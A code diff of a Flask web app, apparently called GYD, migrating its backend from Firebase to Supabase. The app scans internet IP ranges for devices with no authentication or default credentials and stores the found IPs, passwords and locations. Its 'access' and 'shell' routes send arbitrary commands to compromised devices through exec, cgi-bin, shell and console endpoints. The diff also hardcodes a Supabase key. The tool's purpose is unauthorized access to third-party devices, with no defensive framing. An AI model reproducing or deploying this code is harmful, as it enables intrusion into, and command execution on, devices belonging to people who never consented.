@@ -1,46 +1,34 @@
-import os, json, time, threading, uuid
+import os, json, uuid
 from datetime import datetime, timezone
 from functools import wraps
 from flask import Flask, render_template, request, jsonify
-import requests
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 app = Flask(__name__, template_folder=os.path.join(BASE_DIR, 'templates'))
 
-FIREBASE_WEB_API_KEY = os.environ.get("FIREBASE_WEB_API_KEY", "")
-FIREBASE_SERVICE_ACCOUNT = os.environ.get("FIREBASE_SERVICE_ACCOUNT", "")
-FIREBASE_PROJECT_ID = os.environ.get("FIREBASE_PROJECT_ID", "")
+SUPABASE_URL = os.environ.get("SUPABASE_URL", "https://fhlrvzhwjuepftwwnmtm.supabase.co")
+SUPABASE_ANON_KEY = os.environ.get("SUPABASE_ANON_KEY", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZobHJ2emh3anVlcGZ0d3dubXRtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIwNzIwNTcsImV4cCI6MjA5NzY0ODA1N30.8J9W654hvfn3oFHdv4M0yyeQeyWUOWuTEM6Dw6Ri5-M")
+SUPABASE_SERVICE_ROLE_KEY = os.environ.get("SUPABASE_SERVICE_ROLE_KEY", "")
 
-fb_service = None
-fb_db = None
-if FIREBASE_SERVICE_ACCOUNT:
-    import firebase_admin
-    from firebase_admin import credentials, firestore, auth
+supabase = None
+if SUPABASE_URL and SUPABASE_ANON_KEY:
+    from supabase import create_client
     try:
-        cred = credentials.Certificate(json.loads(FIREBASE_SERVICE_ACCOUNT))
-        fb_service = firebase_admin.initialize_app(cred)
-        fb_db = firestore.client()
-        FIREBASE_PROJECT_ID = FIREBASE_PROJECT_ID or cred.project_id
+        supabase = create_client(SUPABASE_URL, SUPABASE_ANON_KEY)
     except Exception as e:
-        print(f"[!] Firebase init error: {e}")
+        print(f"[!] Supabase init error: {e}")
 
-FIREBASE_AUTH_URL = "https://identitytoolkit.googleapis.com/v1/accounts"
+INVITE_ONLY = os.environ.get("INVITE_ONLY", "true").lower() == "true"
 
-def fb_req(endpoint, data):
-    if not FIREBASE_WEB_API_KEY:
+def get_supabase():
+    return supabase
+
+def verify_token(token):
+    if not supabase:
         return None
     try:
-        r = requests.post(f"{FIREBASE_AUTH_URL}:{endpoint}?key={FIREBASE_WEB_API_KEY}", json=data, timeout=10)
-        return r.json() if r.status_code in (200, 201) else None
-    except:
-        return None
-
-def verify_fb_token(id_token):
-    if not fb_service:
-        return None
-    try:
-        decoded = auth.verify_id_token(id_token)
-        return decoded
+        resp = supabase.auth.get_user(token)
+        return resp.user
     except:
         return None
 
@@ -48,11 +36,7 @@ def get_user_by_token():
     auth_h = request.headers.get("Authorization", "")
     if not auth_h.startswith("Bearer "):
         return None
-    token = auth_h[7:]
-    decoded = verify_fb_token(token)
-    if decoded:
-        return decoded
-    return None
+    return verify_token(auth_h[7:])
 
 def require_auth(f):
     @wraps(f)
@@ -63,125 +47,78 @@ def require_auth(f):
         return f(user=user, *a, **kw)
     return wrapper
 
-def fb_get_user_by_email(email):
-    if not fb_service:
-        return None
-    try:
-        return auth.get_user_by_email(email)
-    except:
-        return None
-
-def fb_create_user(email, password):
-    if not fb_service:
-        return None
-    try:
-        return auth.create_user(email=email, password=password)
-    except Exception as e:
-        return {"error": str(e)}
-
-def fb_collection(name):
-    return fb_db.collection(name) if fb_db else None
-
-def fb_doc(collection, doc_id):
-    c = fb_collection(collection)
-    return c.document(doc_id) if c else None
-
-lock = threading.Lock()
-
-INVITE_ONLY = os.environ.get("INVITE_ONLY", "true").lower() == "true"
-
 # ─────────────── Auth routes ───────────────
-
-@app.route("/api/auth/register", methods=["POST"])
-def api_register():
-    body = request.get_json(force=True)
-    id_token = body.get("id_token", "")
-    invite = body.get("invite_code", "").strip()
-
-    if not id_token:
-        return jsonify({"error": "id_token required"}), 400
-
-    decoded = verify_fb_token(id_token)
-    if not decoded:
-        return jsonify({"error": "invalid token"}), 401
-
-    uid = decoded.get("uid", "")
-    email = decoded.get("email", "").strip().lower()
-    if not email:
-        email = body.get("email", "").strip().lower()
-    username = body.get("username", email.split("@")[0])
-
-    if INVITE_ONLY:
-        if not invite:
-            return jsonify({"error": "invitation code required"}), 400
-        invites_coll = fb_collection("inviteCodes")
-        if invites_coll:
-            q = invites_coll.where("code", "==", invite).where("status", "==", "active").limit(1).get()
-            if not q or len(q) == 0:
-                return jsonify({"error": "invalid or used invitation code"}), 400
-            inv_doc = q[0]
-            inv_ref = inv_doc.reference
-
-    users_coll = fb_collection("users")
-    if users_coll:
-        existing = users_coll.document(uid).get()
-        if existing.exists:
-            return jsonify({"error": "user already registered"}), 409
-        users_coll.document(uid).set({
-            "email": email,
-            "username": username,
-            "avatar_url": "",
-            "bio": "",
-            "created_at": datetime.now(timezone.utc).isoformat(),
-            "community": "",
-        })
-
-    if INVITE_ONLY and invite:
-        inv_ref.update({"status": "used", "used_by": uid, "used_at": datetime.now(timezone.utc).isoformat()})
-
-    audit = fb_collection("auditLogs")
-    if audit:
-        audit.add({"action": "register", "timestamp": datetime.now(timezone.utc).isoformat(), "target_user": uid})
-
-    return jsonify({"status": "ok", "token": id_token, "user": {"email": email, "username": username, "uid": uid}})
 
 @app.route("/api/auth/login", methods=["POST"])
 def api_login():
     body = request.get_json(force=True)
-    id_token = body.get("id_token", "")
+    token = body.get("access_token", "")
+    if not token:
+        return jsonify({"error": "access_token required"}), 400
+    user = verify_token(token)
+    if not user:
+        return jsonify({"error": "invalid token"}), 401
+    uid = user.id
+    email = user.email or ""
+    username = email.split("@")[0]
+    try:
+        resp = supabase.table("users").select("*").eq("id", uid).limit(1).execute()
+        if resp.data:
+            username = resp.data[0].get("username", username)
+    except:
+        pass
+    return jsonify({"status": "ok", "token": token, "user": {"email": email, "username": username, "uid": uid}})
 
-    if not id_token:
-        return jsonify({"error": "id_token required"}), 400
+@app.route("/api/auth/register", methods=["POST"])
+def api_register():
+    body = request.get_json(force=True)
+    invite = body.get("invite_code", "").strip()
+    token = body.get("access_token", "")
 
-    decoded = verify_fb_token(id_token)
-    if not decoded:
+    if not token:
+        return jsonify({"error": "access_token required"}), 400
+
+    user = verify_token(token)
+    if not user:
         return jsonify({"error": "invalid token"}), 401
 
-    uid = decoded.get("uid", "")
-    email = decoded.get("email", "").strip().lower()
-    users_coll = fb_collection("users")
-    username = email.split("@")[0] if email else uid
-    if users_coll:
-        doc = users_coll.document(uid).get()
-        if doc.exists:
-            user_data = doc.to_dict()
-            username = user_data.get("username", username)
-            email = user_data.get("email", email)
+    uid = user.id
+    email = user.email or ""
+    username = email.split("@")[0]
 
-    return jsonify({"status": "ok", "token": id_token, "user": {"email": email, "username": username, "uid": uid}})
+    if INVITE_ONLY:
+        if not invite:
+            return jsonify({"error": "invitation code required"}), 400
+        try:
+            inv = supabase.table("invite_codes").select("*").eq("code", invite).eq("status", "active").limit(1).execute()
+            if not inv.data:
+                return jsonify({"error": "invalid or used invitation code"}), 400
+        except Exception as e:
+            return jsonify({"error": f"invite check failed: {e}"}), 500
+
+    try:
+        existing = supabase.table("users").select("*").eq("id", uid).limit(1).execute()
+        if existing.data:
+            return jsonify({"error": "user already registered"}), 409
+        supabase.table("users").insert({
+            "id": uid, "email": email, "username": username,
+            "avatar_url": "", "bio": "", "created_at": datetime.now(timezone.utc).isoformat(),
+        }).execute()
+    except Exception as e:
+        return jsonify({"error": f"user creation failed: {e}"}), 500
+
+    if INVITE_ONLY and invite and inv.data:
+        inv_id = inv.data[0]["id"]
+        supabase.table("invite_codes").update({
+            "status": "used", "used_by": uid, "used_at": datetime.now(timezone.utc).isoformat()
+        }).eq("id", inv_id).execute()
+
+    return jsonify({"status": "ok", "token": token, "user": {"email": email, "username": username, "uid": uid}})
 
 @app.route("/api/auth/me", methods=["GET"])
 @require_auth
 def api_me(user):
-    uid = user.get("uid", "")
-    email = user.get("email", "")
-    data = {"email": email, "uid": uid}
-    users_coll = fb_collection("users")
-    if users_coll:
-        doc = users_coll.document(uid).get()
-        if doc.exists:
-            data.update(doc.to_dict())
-    return jsonify({"user": data})
+    return jsonify({"user": {"email": user.email, "uid": user.id, "username": user.email.split("@")[0]}})
 
 @app.route("/api/auth/logout", methods=["POST"])
 def api_logout():
@@ -194,118 +131,100 @@ def api_check_invite():
         return jsonify({"valid": False}), 400
     if not INVITE_ONLY:
         return jsonify({"valid": True})
-    invites_coll = fb_collection("inviteCodes")
-    if invites_coll:
-        q = invites_coll.where("code", "==", code).where("status", "==", "active").limit(1).get()
-        return jsonify({"valid": len(q) > 0})
-    return jsonify({"valid": False})
+    try:
+        inv = supabase.table("invite_codes").select("*").eq("code", code).eq("status", "active").limit(1).execute()
+        return jsonify({"valid": len(inv.data) > 0})
+    except:
+        return jsonify({"valid": False})
 
-# ─────────────── Scan results (Firestore) ───────────────
-
-def _results_ref():
-    return fb_collection("scanResults") if fb_db else None
-
-def _items_ref():
-    return fb_collection("scanResultItems") if fb_db else None
+# ─────────────── Scan results ───────────────
 
 @app.route("/api/results", methods=["GET"])
 @require_auth
 def api_list_results(user):
-    uid = user.get("uid", "")
-    ref = _results_ref()
-    if not ref:
-        return jsonify([])
-    docs = ref.where("user_id", "==", uid).order_by("created_at", direction=firestore.Query.DESCENDING).limit(100).stream()
-    out = []
-    for d in docs:
-        data = d.to_dict()
-        data["id"] = d.id
-        out.append(data)
-    return jsonify(out)
+    try:
+        resp = supabase.table("scan_results").select("*").eq("user_id", user.id).order("created_at", desc=True).limit(100).execute()
+        out = []
+        for r in resp.data:
+            r["id"] = str(r["id"])
+            out.append(r)
+        return jsonify(out)
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 @app.route("/api/results/<result_id>", methods=["GET"])
 @require_auth
 def api_get_result(user, result_id):
-    ref = _results_ref()
-    if not ref:
-        return jsonify({"error": "no db"}), 500
-    doc = ref.document(result_id).get()
-    if not doc.exists:
-        return jsonify({"error": "not found"}), 404
-    data = doc.to_dict()
-    if data.get("user_id") != user.get("uid"):
-        return jsonify({"error": "forbidden"}), 403
-    data["id"] = doc.id
-    return jsonify(data)
+    try:
+        resp = supabase.table("scan_results").select("*").eq("id", result_id).eq("user_id", user.id).limit(1).execute()
+        if not resp.data:
+            return jsonify({"error": "not found"}), 404
+        data = resp.data[0]
+        data["id"] = str(data["id"])
+        return jsonify(data)
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 @app.route("/api/results/<result_id>", methods=["DELETE"])
 @require_auth
 def api_delete_result(user, result_id):
-    ref = _results_ref()
-    if not ref:
-        return jsonify({"status": "error"})
-    doc = ref.document(result_id).get()
-    if not doc.exists or doc.to_dict().get("user_id") != user.get("uid"):
-        return jsonify({"error": "not found"}), 404
-    ref.document(result_id).delete()
-    items = _items_ref()
-    if items:
-        batch = fb_db.batch()
-        q = items.where("result_id", "==", result_id).stream()
-        for d in q:
-            batch.delete(d.reference)
-        batch.commit()
-    return jsonify({"status": "ok"})
+    try:
+        supabase.table("scan_result_items").delete().eq("result_id", result_id).execute()
+        supabase.table("scan_results").delete().eq("id", result_id).eq("user_id", user.id).execute()
+        return jsonify({"status": "ok"})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 @app.route("/api/results/<result_id>/items", methods=["GET"])
 @require_auth
 def api_result_items(user, result_id):
-    ref = _items_ref()
-    if not ref:
-        return jsonify([])
-    docs = ref.where("result_id", "==", result_id).order_by("id").stream()
-    out = []
-    for d in docs:
-        data = d.to_dict()
-        data["id"] = int(data.get("id", 0))
-        out.append(data)
-    return jsonify(out)
+    try:
+        resp = supabase.table("scan_result_items").select("*").eq("result_id", result_id).order("item_index").execute()
+        out = []
+        for r in resp.data:
+            r["id"] = int(r.get("item_index", 0))
+            out.append(r)
+        return jsonify(out)
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 @app.route("/api/results/<result_id>/items/broken", methods=["GET"])
 @require_auth
 def api_broken_items(user, result_id):
-    ref = _items_ref()
-    if not ref:
-        return jsonify([])
-    docs = ref.where("result_id", "==", result_id).where("broken", "==", True).stream()
-    out = []
-    for d in docs:
-        data = d.to_dict()
-        data["id"] = int(data.get("id", 0))
-        out.append(data)
-    return jsonify(out)
+    try:
+        resp = supabase.table("scan_result_items").select("*").eq("result_id", result_id).eq("broken", True).execute()
+        out = []
+        for r in resp.data:
+            r["id"] = int(r.get("item_index", 0))
+            out.append(r)
+        return jsonify(out)
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 # ─────────────── Device interaction ───────────────
 
 @app.route("/api/devices/<item_id>/test", methods=["POST"])
 @require_auth
 def api_test_device(user, item_id):
-    ref = _items_ref()
-    if not ref:
-        return jsonify({"error": "db error"}), 500
-    doc = ref.document(item_id).get()
-    if not doc.exists:
-        return jsonify({"error": "not found"}), 404
-    item = doc.to_dict()
+    import requests as http_req
+    try:
+        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
+        if not resp.data:
+            return jsonify({"error": "not found"}), 404
+        item = resp.data[0]
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
     ip = item.get("ip", "")
     port = item.get("port", 80)
     username = item.get("username", "admin")
     password = item.get("password", "admin")
     scheme = "https" if port in (443, 8443, 9443) else "http"
+    item_uuid = item["id"]
 
     result = {"status": "error", "message": ""}
     try:
-        r = requests.get(f"{scheme}://{ip}:{port}", auth=(username, password),
+        r = http_req.get(f"{scheme}://{ip}:{port}", auth=(username, password),
                          timeout=10, allow_redirects=False, verify=False)
         result["status_code"] = r.status_code
         result["headers"] = dict(r.headers)
@@ -313,7 +232,7 @@ def api_test_device(user, item_id):
         if r.status_code in (200, 301, 302):
             result["status"] = "ok"
             result["message"] = "Credentials work"
-            ref.document(item_id).update({"broken": True, "broken_at": datetime.now(timezone.utc).isoformat()})
+            supabase.table("scan_result_items").update({"broken": True, "broken_at": datetime.now(timezone.utc).isoformat()}).eq("id", item_uuid).execute()
         else:
             result["message"] = f"HTTP {r.status_code}"
     except Exception as e:
@@ -323,13 +242,14 @@ def api_test_device(user, item_id):
 @app.route("/api/devices/<item_id>/access", methods=["POST"])
 @require_auth
 def api_access_device(user, item_id):
-    ref = _items_ref()
-    if not ref:
-        return jsonify({"error": "db error"}), 500
-    doc = ref.document(item_id).get()
-    if not doc.exists or not doc.to_dict().get("broken"):
-        return jsonify({"error": "device not found or not broken yet"}), 404
-    item = doc.to_dict()
+    import requests as http_req
+    try:
+        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
+        if not resp.data or not resp.data[0].get("broken"):
+            return jsonify({"error": "device not found or not broken yet"}), 404
+        item = resp.data[0]
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
     body = request.get_json(force=True) or {}
     action = body.get("action", "info")
@@ -338,25 +258,24 @@ def api_access_device(user, item_id):
     u = item.get("username", "admin")
     p = item.get("password", "admin")
     scheme = "https" if port in (443, 8443, 9443) else "http"
-    auth = (u, p)
 
     result = {"status": "error", "message": ""}
     try:
         if action == "info":
-            r = requests.get(f"{scheme}://{ip}:{port}", auth=auth, timeout=10, verify=False)
+            r = http_req.get(f"{scheme}://{ip}:{port}", auth=(u, p), timeout=10, verify=False)
             result = {"status": "ok", "status_code": r.status_code, "headers": dict(r.headers), "body": r.text[:5000]}
         elif action == "exec":
             cmd = body.get("command", "id")
-            r = requests.get(f"{scheme}://{ip}:{port}/cgi-bin/exec?cmd={cmd}", auth=auth, timeout=10, verify=False)
+            r = http_req.get(f"{scheme}://{ip}:{port}/cgi-bin/exec?cmd={cmd}", auth=(u, p), timeout=10, verify=False)
             result = {"status": "ok", "output": r.text[:5000]}
         elif action == "config":
-            r = requests.get(f"{scheme}://{ip}:{port}/config", auth=auth, timeout=10, verify=False)
+            r = http_req.get(f"{scheme}://{ip}:{port}/config", auth=(u, p), timeout=10, verify=False)
             result = {"status": "ok", "config": r.text[:5000]}
         elif action == "shell":
             cmd = body.get("command", "id")
             for ep in ["/exec", "/cgi-bin/exec", "/shell", "/cmd", "/console"]:
                 try:
-                    r = requests.get(f"{scheme}://{ip}:{port}{ep}?cmd={cmd}", auth=auth, timeout=5, verify=False)
+                    r = http_req.get(f"{scheme}://{ip}:{port}{ep}?cmd={cmd}", auth=(u, p), timeout=5, verify=False)
                     if r.status_code == 200:
                         result = {"status": "ok", "endpoint": ep, "output": r.text[:5000]}
                         break
@@ -420,41 +339,43 @@ def api_scan(user):
             g = geo_data.get(r["ip"], {})
             r.update(g)
 
-    uid = user.get("uid", "")
-    results_ref = _results_ref()
-    items_ref = _items_ref()
+    uid = user.id
     creds_count = sum(1 for r in results if r.get("auth_found"))
     open_count = sum(1 for r in results if r.get("no_auth"))
-    if results and results_ref and items_ref:
-        doc_ref = results_ref.document()
-        rid = doc_ref.id
-        doc_ref.set({
-            "user_id": uid,
-            "total_scanned": len(ips),
-            "results_count": len(results),
-            "creds_count": creds_count,
-            "open_count": open_count,
-            "region": region or "internet",
-            "ports": ports,
-            "created_at": datetime.now(timezone.utc).isoformat(),
-        })
-        for i, r in enumerate(results):
-            item_ref = items_ref.document()
-            item_ref.set({
-                "result_id": rid,
-                "id": i,
-                "ip": r.get("ip"), "port": r.get("port"),
-                "url": r.get("url"), "device": r.get("device"),
-                "no_auth": r.get("no_auth"), "auth_found": r.get("auth_found"),
-                "username": r.get("username"), "password": r.get("password"),
-                "note": r.get("note"), "status_code": r.get("status_code"),
-                "country": r.get("country"), "country_code": r.get("country_code"),
-                "region_name": r.get("region"), "city": r.get("city"),
-                "lat": r.get("lat"), "lon": r.get("lon"),
-                "org": r.get("org"), "isp": r.get("isp"),
-                "as_info": r.get("as"),
-                "broken": False,
-            })
+
+    if results:
+        try:
+            scan_resp = supabase.table("scan_results").insert({
+                "user_id": uid,
+                "total_scanned": len(ips),
+                "results_count": len(results),
+                "creds_count": creds_count,
+                "open_count": open_count,
+                "region": region or "internet",
+                "ports": ports,
+                "created_at": datetime.now(timezone.utc).isoformat(),
+            }).execute()
+            result_id = scan_resp.data[0]["id"]
+            items = []
+            for i, r in enumerate(results):
+                items.append({
+                    "result_id": str(result_id),
+                    "item_index": i,
+                    "ip": r.get("ip"), "port": r.get("port"),
+                    "url": r.get("url"), "device": r.get("device"),
+                    "no_auth": r.get("no_auth"), "auth_found": r.get("auth_found"),
+                    "username": r.get("username"), "password": r.get("password"),
+                    "note": r.get("note"), "status_code": r.get("status_code"),
+                    "country": r.get("country"), "country_code": r.get("country_code"),
+                    "region_name": r.get("region"), "city": r.get("city"),
+                    "lat": r.get("lat"), "lon": r.get("lon"),
+                    "org": r.get("org"), "isp": r.get("isp"),
+                    "as_info": r.get("as"),
+                    "broken": False,
+                })
+            supabase.table("scan_result_items").insert(items).execute()
+        except Exception as e:
+            print(f"[!] DB save error: {e}")
 
     return jsonify({
         "status": "ok",
@@ -468,33 +389,27 @@ def api_scan(user):
 @app.route("/api/admin/invites", methods=["GET"])
 @require_auth
 def api_list_invites(user):
-    ref = fb_collection("inviteCodes")
-    if not ref:
-        return jsonify([])
-    docs = ref.stream()
-    out = []
-    for d in docs:
-        data = d.to_dict()
-        data["id"] = d.id
-        out.append(data)
-    return jsonify(out)
+    try:
+        resp = supabase.table("invite_codes").select("*").order("created_at", desc=True).execute()
+        for r in resp.data:
+            r["id"] = str(r["id"])
+        return jsonify(resp.data)
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 @app.route("/api/admin/invites", methods=["POST"])
 @require_auth
 def api_create_invite(user):
-    body = request.get_json(force=True)
-    code = body.get("code", uuid.uuid4().hex[:8].upper())
-    ref = fb_collection("inviteCodes")
-    if ref:
-        ref.add({
-            "code": code,
-            "status": "active",
-            "issuer": user.get("uid", ""),
-            "created_at": datetime.now(timezone.utc).isoformat(),
-        })
-    return jsonify({"status": "ok", "code": code})
+    code = uuid.uuid4().hex[:8].upper()
+    try:
+        supabase.table("invite_codes").insert({
+            "code": code, "status": "active", "issuer": user.id,
+        }).execute()
+        return jsonify({"status": "ok", "code": code})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
-# ─────────────── Main app route ───────────────
+# ─────────────── Main route ───────────────
 
 @app.route("/")
 def index():
@@ -504,20 +419,18 @@ def index():
 def app_spa():
     return render_template("app.html")
 
-# ─────────────── Health check ───────────────
-
 @app.route("/api/health")
 def api_health():
     return jsonify({
         "status": "ok",
         "time": datetime.now(timezone.utc).isoformat(),
         "version": "7.1",
-        "firebase": bool(fb_service),
+        "supabase": bool(supabase),
         "invite_only": INVITE_ONLY,
     })
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     debug = os.environ.get("VERCEL") != "1"
-    print(f"[*] GYD on Firebase — http://0.0.0.0:{port}")
+    print(f"[*] GYD on Supabase — http://0.0.0.0:{port}")
     app.run(host="0.0.0.0", port=port, debug=debug)
